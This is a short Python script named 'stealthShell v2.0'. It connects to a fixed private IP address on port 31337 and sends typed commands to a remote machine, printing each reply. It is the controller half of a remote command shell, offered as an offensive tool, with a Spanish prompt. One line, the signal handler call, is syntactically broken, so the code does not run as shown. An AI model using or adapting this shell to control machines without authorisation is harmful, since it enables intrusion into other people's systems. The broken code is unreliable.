#!/usr/bin/python

# stealthShell v2.0, Author @guguvk (Axel González)

import socket, signal

signal.signal(signal.SIGINT, signal.SIG_D, signal

address = "192.168.154.128"
with socket.socket() as s:
    s.connect((address, 31337))

    while True:
        command = input("Ingresa el comando: ")
        if command == "exit":
            s.send(command.encode())
            break
        else:
            s.send(command.encode())
            print("\n" + s.recv(4090).decode())
